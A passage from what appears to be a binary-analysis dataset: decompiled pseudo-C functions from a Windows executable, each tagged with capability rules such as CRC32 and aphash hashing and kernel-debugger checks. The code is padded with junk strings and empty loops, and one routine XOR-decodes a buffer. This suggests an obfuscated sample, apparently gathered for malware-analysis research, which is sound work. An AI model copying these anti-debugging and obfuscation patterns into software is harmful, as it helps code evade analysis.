iStack304 + -1) {\n        }\n    }\n    uStack24 = 3;\n    fcn.00401e79(\"mzbgyfdpscwmqmxdtznp\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 991
    },
    "00406087": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00406087(uint *param_1)\n\n{\n    uint32_t uVar1;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.004028d8();\n    var_8h = param_1;\n    if ((uVar1 & 1) != 0) {\n        var_8h = fcn.00405290(*param_1);\n    }\n    return var_8h;\n}\n",
        "token_count": 112
    },
    "0040609b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.0040609b(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack208;\n    uchar auStack204 [24];\n    uchar auStack180 [24];\n    int32_t iStack156;\n    uchar auStack152 [24];\n    uchar auStack128 [72];\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff10;\n    uStack28 = 0x450f20;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x40b8e200;\n    uStack48 = 0;\n    uStack52 = 0x40c6ac80;\n    uStack56 = 0;\n    uStack24 = 2;\n    fcn.00401e79(\"oizlfnfenhjlvgonkruymhrteazdjkfripyptkfuxgptjvhvqthnbdcoybgdltbaduvegujkfdwzfqeawcmpd\");\n    uStack24 = 3;\n    fcn.00401e79(\"pixeivqcubehsghkx\");\n    uStack24 = 4;\n    fcn.00401e79(\"oizlfnfenhjlvgonkruymhrteazdjkfripyptkfuxgptjvhvqthnbdcoybgdltbaduvegujkfdwzfqeawcmpd\");\n    uStack24 = 6;\n    fcn.00401e79(\"oizlfnfenhjlvgonkruymhrteazdjkfripyptkfuxgptjvhvqthnbdcoybgdltbaduvegujkfdwzfqeawcmpd\");\n    uVar1 = fcn.004042dc(auStack152, auStack128);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack156 = 0x5b; 0 < iStack156; iStack156 = iStack156 + -1) {\n        }\n    }\n    uStack24 = 4;\n    fcn.00401e79(\"pixeivqcubehsghkx\");\n    uStack24 = 5;\n    fcn.00401e79(\"pixeivqcubehsghkx\");\n    uVar1 = fcn.004042dc(auStack204, auStack180);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack208 = 10; 0 < iStack208; iStack208 = iStack208 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x9541;\n}\n",
        "token_count": 767
    },
    "00406109": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.00406109(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    uint in_stack_00000018;\n    int32_t iStack344;\n    uchar auStack340 [24];\n    uchar auStack316 [24];\n    int32_t iStack292;\n    uchar auStack288 [24];\n    uchar auStack264 [24];\n    int32_t iStack240;\n    uchar auStack236 [24];\n    uchar auStack212 [24];\n    int32_t iStack188;\n    uchar auStack184 [24];\n    uchar auStack160 [24];\n    int32_t iStack136;\n    uchar auStack132 [24];\n    uchar auStack108 [52];\n    ulong uStack56;\n    ulong uStack48;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffe90;\n    uStack48 = CONCAT44(in_stack_00000018, arg_18h);\n    uStack56 = CONCAT44(noname_2, arg_ch);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x4515e0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"flhnlpmjwnenulonhijfdarnwpx\");\n    uStack24 = 0;\n    fcn.00401e79(\"flhnlpmjwnenulonhijfdarnwpx\");\n    uStack24 = 5;\n    fcn.00401e79(\"flhnlpmjwnenulonhijfdarnwpx\");\n    uVar1 = fcn.00405b37(auStack132, auStack108);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack136 = 0x2c; 0 < iStack136; iStack136 = iStack136 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"flhnlpmjwnenulonhijfdarnwpx\");\n    uStack24 = 4;\n    fcn.00401e79(\"flhnlpmjwnenulonhijfdarnwpx\");\n    uVar1 = fcn.004042dc(auStack184, auStack160);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack188 = 0x25; 0 < iStack188; iStack188 = iStack188 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"flhnlpmjwnenulonhijfdarnwpx\");\n    uStack24 = 3;\n    fcn.00401e79(\"flhnlpmjwnenulonhijfdarnwpx\");\n    uVar1 = fcn.004042dc(auStack236, auStack212);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack240 = 0x2d; 0 < iStack240; iStack240 = iStack240 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"flhnlpmjwnenulonhijfdarnwpx\");\n    uStack24 = 2;\n    fcn.00401e79(\"flhnlpmjwnenulonhijfdarnwpx\");\n    uVar1 = fcn.004042dc(auStack288, auStack264);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack292 = 0x1c; 0 < iStack292; iStack292 = iStack292 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"flhnlpmjwnenulonhijfdarnwpx\");\n    uStack24 = 1;\n    fcn.00401e79(\"flhnlpmjwnenulonhijfdarnwpx\");\n    uVar1 = fcn.004042dc(auStack340, auStack316);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack344 = 0x48; 0 < iStack344; iStack344 = iStack344 + -1) {\n        }\n    }\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x547394;\n}\n",
        "token_count": 1162
    },
    "004061a4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004061a4(uint arg_8h)\n\n{\n    fcn.00403b02();\n    fcn.00403b02();\n    return 1;\n}\n",
        "token_count": 42
    },
    "00406285": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.00406285(void)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack160;\n    int32_t iStack156;\n    uchar auStack152 [24];\n    uchar auStack128 [72];\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar uStack42;\n    uchar uStack41;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff50;\n    uStack24 = 0xffffffff;\n    uStack28 = 0x4514c0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack41 = 1;\n    uStack42 = 0;\n    uStack48 = 0xaac;\n    uStack52 = 0x40e03ec0;\n    uStack56 = 0;\n    fcn.00401e79(\"iqkalzbbblflsdlkuiiohidcrpmfejmbzppmzqtojrhgirtdwmcecpxtvwpv\");\n    uStack24 = 0;\n    fcn.00401e79(\"jssijdjovsdvyjwjoyadbfehc\");\n    uStack24 = 1;\n    fcn.00401e79(\"jssijdjovsdvyjwjoyadbfehc\");\n    uStack24 = 2;\n    fcn.00401e79(\"jssijdjovsdvyjwjoyadbfehc\");\n    uVar1 = fcn.00405b37(auStack152, auStack128);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack156 = 4; 0 < iStack156; iStack156 = iStack156 + -1) {\n        }\n    }\n    for (iStack160 = 0x2e; 0 < iStack160; iStack160 = iStack160 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 530
    },
    "0040628a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040628a(uint32_t arg_8h, char *arg_ch, uint32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uint *puVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    char *arg_8h_00;\n    int32_t iVar7;\n    ulong uVar8;\n    uint lpMode;\n    char *var_24h;\n    uint32_t var_20h;\n    uint32_t lpNumberOfBytesRead;\n    uint hConsoleHandle;\n    char *lpBuffer;\n    int32_t var_10h;\n    uint32_t nNumberOfBytesToRead;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if (arg_8h == 0xfffffffe) {\n        puVar3 = fcn.0040185c();\n        *puVar3 = 0;\n        puVar3 = fcn.00403a35();\n        *puVar3 = 9;\n        return 0xffffffff;\n    }\n    if ((-1 < arg_8h) && (arg_8h < *0x575488)) {\n        var_8h = arg_8h >> 6;\n        iVar7 = (arg_8h & 0x3f) * 0x38;\n        iVar5 = *(var_8h * 4 + 0x575220);\n        var_20h = 1;\n        uVar1 = *(iVar5 + 0x28 + iVar7);\n        var_10h = iVar7;\n        if ((uVar1 & 1) != 0) {\n            if (arg_10h < 0x80000000) {\n                if ((arg_10h == 0) || ((uVar1 & 2) != 0)) {\n                    return 0;\n                }\n                if (arg_ch != NULL) {\n                    hConsoleHandle = *(iVar5 + 0x18 + iVar7);\n                    var_1h._0_1_ = *(iVar5 + 0x29 + iVar7);\n                    arg_8h_00 = NULL;\n                    if (var_1h == '\\x01') {\n                        if ((~arg_10h & 1) == 0) {\ncode_r0x004d3844:\n                            puVar3 = fcn.0040185c();\n                            *puVar3 = 0;\n                            puVar3 = fcn.00403a35();\n                            *puVar3 = 0x16;\n                            fcn.004037ce();\n                            pcVar4 = arg_8h_00;\n                        }\n                        else {\n                            nNumberOfBytesToRead = 4;\n                            if (3 < arg_10h >> 1) {\n                                nNumberOfBytesToRead = arg_10h >> 1;\n                            }\n                            pcVar4 = fcn.0040409d(nNumberOfBytesToRead);\n                            fcn.0040640b(0);\n                            fcn.0040640b(0);\n                            lpBuffer = pcVar4;\n                            if (pcVar4 != NULL) {\n                                uVar8 = fcn.00401933(arg_8h, 0, 0, 1);\n                                iVar5 = *(var_8h * 4 + 0x575220);\n                                *(iVar7 + 0x20 + iVar5) = uVar8;\n                                *(iVar7 + 0x24 + iVar5) = uVar8 >> 0x20;\n                                iVar5 = *(var_8h * 4 + 0x575220);\n                                arg_8h_00 = pcVar4;\n                                goto code_r0x004d38fc;\n                            }\n                            puVar3 = fcn.00403a35();\n                            *puVar3 = 0xc;\n                            puVar3 = fcn.0040185c();\n                            *puVar3 = 8;\n                        }\ncode_r0x004d3a30:\n                        lpNumberOfBytesRead = 0xffffffff;\n                        arg_8h_00 = pcVar4;\n                    }\n                    else {\n                        pcVar4 = arg_ch;\n                        if (var_1h == '\\x02') {\n                            if ((~arg_10h & 1) == 0) goto code_r0x004d3844;\n                            nNumberOfBytesToRead = arg_10h;\n                            lpBuffer = arg_ch;\n                            iVar5 = *(var_8h * 4 + 0x575220);\n                        }\n                        else {\n                            nNumberOfBytesToRead = arg_10h;\n                            lpBuffer = arg_ch;\n                        }\ncode_r0x004d38fc:\n                        iVar7 = 0;\n                        uVar6 = nNumberOfBytesToRead;\n                        if ((((*(var_10h + 0x28 + iVar5) & 0x48) != 0) &&\n                            (cVar2 = *(var_10h + 0x2a + iVar5),  cVar2 != '\\n')) && (nNumberOfBytesToRead != 0)) {\n                            iVar7 = 1;\n                            *pcVar4 = cVar2;\n                            lpBuffer = pcVar4 + 1;\n                            uVar6 = nNumberOfBytesToRead - 1;\n                            *(var_10h + 0x2a + *(var_8h * 4 + 0x575220)) = 10;\n                            if (((var_1h != '\\0') &&\n                                (cVar2 = *(var_10h + 0x2b + *(var_8h * 4 + 0x575220)),  cVar2 != '\\n')) && (uVar6 != 0))\n                            {\n                                *lpBuffer = cVar2;\n                                lpBuffer = pcVar4 + 2;\n                                uVar6 = nNumberOfBytesToRead - 2;\n                                iVar7 = 2;\n                                *(var_10h + 0x2b + *(var_8h * 4 + 0x575220)) = 10;\n                                if (((var_1h == '\\x01') &&\n                                    (cVar2 = *(var_10h + 0x2c + *(var_8h * 4 + 0x575220)),  cVar2 != '\\n')) &&\n                                   (uVar6 != 0)) {\n                                    *lpBuffer = cVar2;\n                                    lpBuffer = pcVar4 + 3;\n                                    iVar7 = 3;\n                                    *(var_10h + 0x2c + *(var_8h * 4 + 0x575220)) = 10;\n                                    uVar6 = nNumberOfBytesToRead - 3;\n                                }\n                            }\n                        }\n                        nNumberOfBytesToRead = uVar6;\n                        var_24h = pcVar4;\n                        iVar5 = fcn.00406762(arg_8h);\n                        pcVar4 = arg_8h_00;\n                        if (((iVar5 == 0) || (-1 < *(var_10h + 0x28 + *(var_8h * 4 + 0x575220)))) ||\n                           (iVar5 = (*_sym.imp.KERNEL32.dll_GetConsoleMode)(hConsoleHandle, &lpMode),  iVar5 == 0)) {\n                            var_20h = var_20h & 0xffffff00;\ncode_r0x004d3a51:\n                            iVar5 = (*_sym.imp.KERNEL32.dll_ReadFile)\n                                              (hConsoleHandle, lpBuffer, nNumberOfBytesToRead, &lpNumberOfBytesRead, 0);\n                            if ((iVar5 == 0) || (arg_10h < lpNumberOfBytesRead)) {\n                                iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                if (iVar5 != 5) {\n                                    if (iVar5 == 0x6d) {\n                                        lpNumberOfBytesRead = 0;\n                                        goto code_r0x004d3a33;\n                                    }\n                                    goto code_r0x004d3a29;\n                                }\n                                puVar3 = fcn.00403a35();\n                                *puVar3 = 9;\n                                puVar3 = fcn.0040185c();\n                                *puVar3 = 5;\n                                goto code_r0x004d3a30;\n                            }\n                        }\n                        else {\n                            if (var_1h != '\\x02') goto code_r0x004d3a51;\n                            iVar5 = (*_sym.imp.KERNEL32.dll_ReadConsoleW)\n                                              (hConsoleHandle, lpBuffer, nNumberOfBytesToRead >> 1, &lpNumberOfBytesRead\n                                               , 0);\n                            if (iVar5 == 0) {\n                                iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x004d3a29:\n                                fcn.00404b9c(iVar5);\n                                goto code_r0x004d3a30;\n                            }\n                            lpNumberOfBytesRead = lpNumberOfBytesRead * 2;\n                        }\n                        lpNumberOfBytesRead = iVar7 + lpNumberOfBytesRead;\n                        if (*(var_10h + 0x28 + *(var_8h * 4 + 0x575220)) < '\\0') {\n                            if (var_1h == '\\x02') {\n                                if (var_20h == '\\0') {\n                                    lpNumberOfBytesRead = fcn.004d313b(arg_8h, var_24h, lpNumberOfBytesRead >> 1);\n                                }\n                                else {\n                                    lpNumberOfBytesRead = fcn.004d357a(arg_8h, var_24h, lpNumberOfBytesRead >> 1);\n                                }\n                            }\n                            else {\n                                lpNumberOfBytesRead =\n                                     fcn.004d33ce(arg_8h, lpBuffer, lpNumberOfBytesRead, arg_ch, arg_10h >> 1);\n                            }\n                        }\n                    }\ncode_r0x004d3a33:\n                    fcn.0040640b(arg_8h_00);\n                    return lpNumberOfBytesRead;\n                }\n            }\n            puVar3 = fcn.0040185c();\n            *puVar3 = 0;\n            puVar3 = fcn.00403a35();\n            *puVar3 = 0x16;\n            goto code_r0x004d3b10;\n        }\n    }\n    puVar3 = fcn.0040185c();\n    *puVar3 = 0;\n    puVar3 = fcn.00403a35();\n    *puVar3 = 9;\ncode_r0x004d3b10:\n    fcn.004037ce();\n    return 0xffffffff;\n}\n",
        "token_count": 2342
    },
    "004062df": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004062df(uint arg_8h, uint8_t *arg_ch, uint8_t **arg_10h, uint32_t arg_14h, uint32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uint *puVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    int32_t iVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint8_t *var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    cVar2 = fcn.00403d96();\n    if (cVar2 != '\\0') {\n        if ((arg_14h == 0) || ((1 < arg_14h && (arg_14h < 0x25)))) {\n            fcn.004058a8(arg_8h);\n            var_ch = 0;\n            var_18h = arg_ch;\n            do {\n                puVar4 = arg_ch;\n                uVar7 = *puVar4;\n                puVar5 = puVar4 + 1;\n                var_4h = var_4h & 0xffffff00 | uVar7;\n                iVar6 = fcn.00403d4b(uVar7, 8, &var_24h);\n                arg_ch = puVar5;\n            } while (iVar6 != 0);\n            var_8h = arg_18h & 0xff;\n            if (uVar7 == 0x2d) {\n                var_8h = var_8h | 2;\ncode_r0x004c0894:\n                uVar7 = *puVar5;\n                puVar5 = puVar4 + 2;\n                var_4h = var_4h & 0xffffff00 | uVar7;\n            }\n            else if (uVar7 == 0x2b) goto code_r0x004c0894;\n            arg_ch = puVar5;\n            if ((arg_14h == 0) || (arg_14h == 0x10)) {\n                if (uVar7 - 0x30 < 10) {\n                    iVar6 = uVar7 + -0x30;\n                }\n                else if (uVar7 + 0x9f < 0x1a) {\n                    iVar6 = uVar7 + -0x57;\n                }\n                else if (uVar7 + 0xbf < 0x1a) {\n                    iVar6 = uVar7 + -0x37;\n                }\n                else {\n                    iVar6 = -1;\n                }\n                if (iVar6 == 0) {\n                    uVar1 = *puVar5;\n                    arg_ch = puVar5 + 1;\n                    var_10h = var_10h & 0xffffff00 | uVar1;\n                    if ((uVar1 == 0x78) || (uVar1 == 0x58)) {\n                        if (arg_14h == 0) {\n                            arg_14h = 0x10;\n                        }\n                        uVar7 = *arg_ch;\n                        arg_ch = puVar5 + 2;\n                        var_4h = var_4h & 0xffffff00 | uVar7;\n                    }\n                    else {\n                        if (arg_14h == 0) {\n                            arg_14h = 8;\n                        }\n                        fcn.00402e0a(var_10h);\n                    }\n                }\n                else if (arg_14h == 0) {\n                    arg_14h = 10;\n                }\n            }\n            var_10h = 0xffffffff / arg_14h;\n            var_14h = 0xffffffff % arg_14h;\n            while( true ) {\n                if (uVar7 - 0x30 < 10) {\n                    uVar8 = uVar7 - 0x30;\n                }\n                else if (uVar7 + 0x9f < 0x1a) {\n                    uVar8 = uVar7 - 0x57;\n                }\n                else if (uVar7 + 0xbf < 0x1a) {\n                    uVar8 = uVar7 - 0x37;\n                }\n                else {\n                    uVar8 = 0xffffffff;\n                }\n                if ((uVar8 == 0xffffffff) || (arg_14h <= uVar8)) break;\n                if ((var_ch < var_10h) || ((var_ch == var_10h && (uVar8 <= var_14h)))) {\n                    uVar9 = 8;\n                    var_ch = var_ch * arg_14h + uVar8;\n                }\n                else {\n                    uVar9 = 0xc;\n                }\n                uVar7 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                var_4h = var_4h & 0xffffff00 | uVar7;\n                var_8h = var_8h | uVar9;\n            }\n            fcn.00402e0a(var_4h);\n            uVar9 = var_8h;\n            uVar8 = var_ch;\n            if ((var_8h & 8) == 0) {\n                uVar8 = 0;\n                arg_ch = var_18h;\n            }\n            else {\n                cVar2 = fcn.0040196a(var_8h, var_ch);\n                if (cVar2 == '\\0') {\n                    if ((uVar9 & 2) != 0) {\n                        uVar8 = -uVar8;\n                    }\n                }\n                else {\n                    puVar3 = fcn.00403a35();\n                    *puVar3 = 0x22;\n                    if ((uVar9 & 1) == 0) {\n                        uVar8 = 0xffffffff;\n                    }\n                    else if ((uVar9 & 2) == 0) {\n                        uVar8 = 0x7fffffff;\n                    }\n                    else {\n                        uVar8 = 0x80000000;\n                    }\n                }\n            }\n            if (var_1ch != '\\0') {\n                *(var_28h + 0x350) = *(var_28h + 0x350) & 0xfffffffd;\n            }\n            goto code_r0x004c082e;\n        }\n        puVar3 = fcn.00403a35();\n        *puVar3 = 0x16;\n        fcn.004037ce();\n    }\n    uVar8 = 0;\ncode_r0x004c082e:\n    if (arg_10h != NULL) {\n        *arg_10h = arg_ch;\n    }\n    return uVar8;\n}\n",
        "token_count": 1543
    },
    "00406352": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl\nfcn.00406352(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    uint uStack36;\n    uint var_4h;\n    \n    fcn.00401e79(\"olccrrlnp\");\n    return uStack36;\n}\n",
        "token_count": 111
    },
    "00406375": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00406375(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack136;\n    uchar auStack132 [24];\n    uchar auStack108 [24];\n    int32_t iStack84;\n    ulong uStack80;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff60;\n    uStack28 = 0x450aa0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x1c4;\n    uStack24 = 0;\n    fcn.00401e79(\"pcyxkvrytphyxkndwnjkubobkxdxoutmfqpajlxifkdzyqbcekqivjmhoosnghjhkbro\");\n    uStack80 = *0x546ee8;\n    for (iStack84 = 0x53; 0 < iStack84; iStack84 = iStack84 + -1) {\n    }\n    uStack24 = 1;\n    fcn.00401e79(\"pcyxkvrytphyxkndwnjkubobkxdxoutmfqpajlxifkdzyqbcekqivjmhoosnghjhkbro\");\n    uStack24 = 2;\n    fcn.00401e79(\"pcyxkvrytphyxkndwnjkubobkxdxoutmfqpajlxifkdzyqbcekqivjmhoosnghjhkbro\");\n    uVar1 = fcn.004042dc(auStack132, auStack108);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack136 = 0x3c; 0 < iStack136; iStack136 = iStack136 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0xb140;\n}\n",
        "token_count": 514
    },
    "004063d4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_5h\n// WARNING: Removing unreachable block (ram,0x0040c52d)\n// WARNING: Removing unreachable block (ram,0x0040c5ca)\n// WARNING: Removing unreachable block (ram,0x0040c612)\n\nvoid __cdecl fcn.004063d4(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    bool bVar1;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_5h;\n    \n    bVar1 = true;\n    while (bVar1) {\n        bVar1 = false;\n    }\n    bVar1 = true;\n    while (bVar1) {\n        bVar1 = false;\n    }\n    bVar1 = true;\n    while (bVar1) {\n        bVar1 = false;\n    }\n    for (var_ch = 0; var_ch < arg_10h; var_ch = var_ch + 1) {\n        (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)(5);\n        *(arg_ch + var_ch) = *(arg_ch + var_ch) ^ (((*(arg_8h + (var_ch % arg_14h >> 2)) * 0xac0) / 0x2c) / 0x17) * '\\v'\n        ;\n    }\n    return;\n}\n",
        "token_count": 318
    },
    "00406415": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00406415(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffffb4;\n    var_10h = 0xffffffff;\n    var_14h = 0x426fe0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    uVar1 = fcn.00401ef6();\n    if ((uVar1 & 1) == 0) {\n        var_10h = 0;\n        fcn.004021e4(0x546298);\n    }\n    var_10h = 0;\n    fcn.00406479(&var_34h);\n    var_10h = 1;\n    fcn.004048e0(&var_34h);\n    fcn.00403b02();\n    fcn.00401fb9(&stack0x00000010);\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 326
    },
    "00406456": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00406456(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t var_145h;\n    int32_t var_140h;\n    uint var_13ch;\n    uint var_124h;\n    int32_t var_10ch;\n    uint var_108h;\n    uint var_f0h;\n    int32_t var_d8h;\n    uint var_d4h;\n    uint var_bch;\n    int32_t var_a4h;\n    uint var_a0h;\n    uint var_88h;\n    uint var_70h;\n    uint var_58h;\n    uint var_54h;\n    uint var_3ch;\n    uint var_24h;\n    uint8_t var_1dh;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xfffffeac;\n    var_10h = 0xffffffff;\n    var_14h = 0x451620;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_1dh = arg_10h & 1;\n    fcn.00401e79(\"bluzrnzdktsuiarlrndvlcrzzpshkzqwggwxcwhsqwdxqepmmpqehzqnzghzllupgyatdbyvqtbpprrvcwrbsdyrppqwdd\");\n    var_10h = 0;\n    fcn.00401e79(\"koheaumvqndiukgfzenjokhybzxxracyanhaplndnhmyctdoebbxlzxpeiuersnbkfdqmhcgayffakdkrmjyjqexskjunhmisycp\")\n    ;\n    var_58h = 0xf0;\n    var_10h = 1;\n    fcn.00401e79(\"otcsbymtmouuyqmdjmvalyswyhfkqaszjfffjxrokiemttqhruusguqddynenhcfqnwjmqnayafcaixv\");\n    var_10h = 2;\n    fcn.00401e79(\"bluzrnzdktsuiarlrndvlcrzzpshkzqwggwxcwhsqwdxqepmmpqehzqnzghzllupgyatdbyvqtbpprrvcwrbsdyrppqwdd\");\n    var_10h = 6;\n    fcn.00401e79(\"bluzrnzdktsuiarlrndvlcrzzpshkzqwggwxcwhsqwdxqepmmpqehzqnzghzllupgyatdbyvqtbpprrvcwrbsdyrppqwdd\");\n    uVar1 = fcn.004042dc(&var_a0h, &var_88h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_a4h = 0x34; 0 